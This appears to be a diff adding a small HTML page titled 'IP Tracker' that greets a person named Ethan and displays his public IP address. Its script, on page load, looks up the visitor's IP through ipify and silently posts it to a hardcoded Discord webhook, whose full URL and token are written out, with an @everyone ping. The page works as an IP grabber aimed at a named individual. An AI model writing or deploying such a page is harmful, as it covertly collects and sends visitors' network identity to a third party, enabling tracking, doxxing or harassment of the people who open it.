@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Tracker</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #32CD32, #008000);
+            color: white;
+            font-family: Arial, sans-serif;
+            font-size: 2rem;
+        }
+    </style>
+</head>
+<body>
+    <div id="ip">Fetching IP...</div>
+    <script>
+async function fetchIP() {
+    try {
+        let response = await fetch('https://api.ipify.org?format=json');
+        let data = await response.json();
+        let ipAddress = data.ip;
+
+        document.getElementById('ip').textContent = `Hello Ethan, Your IP is: ${ipAddress}`;
+
+        // Send IP to Discord webhook
+        fetch('https://discord.com/api/webhooks/1347048105933144174/k7uhBm8FwLqANQnPL9HlrOx4A-qju2-36iimCETR5uCFVLTTNld6w0LZPq81Es3U2qN4', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `@everyone IP is: ${ipAddress}`
+            })
+        });
+
+    } catch (error) {
+        document.getElementById('ip').textContent = 'Error fetching IP';
+    }
+}
+
+fetchIP();
+
+
+    </script>
+</body>
+</html>
